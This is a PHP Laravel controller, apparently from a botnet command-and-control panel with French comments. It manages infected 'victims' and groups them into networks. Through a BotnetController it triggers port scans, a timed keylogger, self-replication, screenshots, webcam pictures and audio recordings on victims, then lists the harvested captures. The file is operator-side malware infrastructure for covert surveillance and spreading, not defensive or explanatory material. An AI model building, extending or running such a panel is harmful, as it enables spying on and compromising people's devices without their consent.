<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Victims;
use App\Models\Network;
use App\Models\VictimGroup;
use App\Models\GroupAttacks;
use App\Models\VictimAttacks;

class VictimsController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $username = auth()->user()->firtsname;
        $name = auth()->user()->lastname;
    
        $victims = Victims::doesntHave('victimGroups')->get();
    
        // Récupérer tous les groupes
        $groups = Network::all();
    
        return view('victims', ['username' => $username, 'name' => $name, 'victims' => $victims, 'groups' => $groups]);
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     */
    public function show(string $id)
    {
        $username = auth()->user()->firstname;
        $name = auth()->user()->lastname;
    
        // Récupérer les informations de la victime
        $victim = Victims::find($id);
    
        // Récupérer le groupe de la victime
        $victimGroup = VictimGroup::where('victim_id', $victim->id)->first();
        $group = $victimGroup ? Network::find($victimGroup->group_id) : null;
    
        // Récupérer les enregistrements de la victime
        $records = VictimAttacks::where('victim_id', $victim->id)
            ->where('victim_attacks.type', 'record')
            ->where('victim_attacks.state', 'done')
            ->get();
    
        // Récupérer les photos de la victime
        $pictures = VictimAttacks::where('victim_id', $victim->id)
            ->where('victim_attacks.type', 'picture')
            ->where('victim_attacks.state', 'done')
            ->get();
    
        // Récupérer les captures d'écran de la victime
        $screenshots = VictimAttacks::where('victim_id', $victim->id)
            ->where('victim_attacks.type', 'screenshot')
            ->where('victim_attacks.state', 'done')
            ->get();
    
        // Récupérer les scans de la victime
        $scans = VictimAttacks::where('victim_id', $victim->id)
            ->where('victim_attacks.type', 'scan')
            ->where('victim_attacks.state', 'done')
            ->get();
    
        // Récupérer les keyloggers de la victime
        $keyloggers = VictimAttacks::where('victim_id', $victim->id)
            ->where('victim_attacks.type', 'keylogger')
            ->where('victim_attacks.state', 'done')
            ->get();
        // Récupérer les autorep de la victime
        $autoreps = VictimAttacks::where('victim_id', $victim->id)
            ->where('victim_attacks.type', 'autorep')
            ->get();
    
        return view('victims.show', [
            'username' => $username, 
            'name' => $name,
            'victim' => $victim,
            'group' => $group,
            'records' => $records,
            'pictures' => $pictures,
            'screenshots' => $screenshots,
            'scans' => $scans,
            'keyloggers' => $keyloggers,
            'autoreps' => $autoreps
        ]);
    }
    

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        // Récupérer l'id de la victime
        $victim = Victims::find($id);
    
        // Récupérer l'id du groupe
        $groupId = $request->input('group'); // Assurez-vous que cela correspond au 'name' dans le <select>
    
        // Créer une nouvelle association dans victim_groups
        $victimGroup = new VictimGroup();
        $victimGroup->victim_id = $victim->id;
        $victimGroup->group_id = $groupId;
        $victimGroup->save();
    
        return redirect()->route('victims.index')->with('success', 'Victime ajoutée au groupe avec succès.');
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }

    public function scan(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;

        $scan = (new BotnetController)->scan($victim_uid);

        return redirect("/victims/$victim_id");
    }

    public function scanport(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;
        $ip = $request->ip;
        $port1 = $request->port1;
        $port2 = $request->port2;

        if ($port2 < $port1 && $port2 != ""){
            return redirect("/victims/$victim_id")->with('output', "Port de fin doit être supérieur au port de début.");
        }
        
        if($port2 == ""){
            $scan = (new BotnetController)->scanport($victim_uid, $ip, $port1);
        }else{
            $scan = (new BotnetController)->scanports($victim_uid, $ip, $port1, $port2);
        }

        return redirect("/victims/$victim_id")->with('output', "Scan lancé sur l'adresse $ip.");
    }

    public function keylogger(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;
        $time = $request->time;

        $keylogger = (new BotnetController)->keylogger($victim_uid, $time);

        return redirect("/victims/$victim_id")->with('output', "Keylogger lancé sur la victime.");
    }

    public function autorep(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;

        $autorep = (new BotnetController)->autorep($victim_uid);

        return redirect("/victims/$victim_id")->with('output', "Auto-replication lancé sur la victime.");
    }

    public function screenshot(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;

        $screenshot = (new BotnetController)->screenshot($victim_uid);

        return redirect("/victims/$victim_id")->with('output', "Capture d'écran lancée sur la victime.");
    }

    public function picture(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;

        $picture = (new BotnetController)->picture($victim_uid);

        return redirect("/victims/$victim_id")->with('output', "Photo lancée sur la victime.");
    }

    public function record(Request $request)
    {
        $victim_id = $request->victim_id;
        $victim_uid = $request->victim_uid;

        $record = (new BotnetController)->record($victim_uid);

        return redirect("/victims/$victim_id")->with('output', "Enregistrement lancé sur la victime.");
    }
}
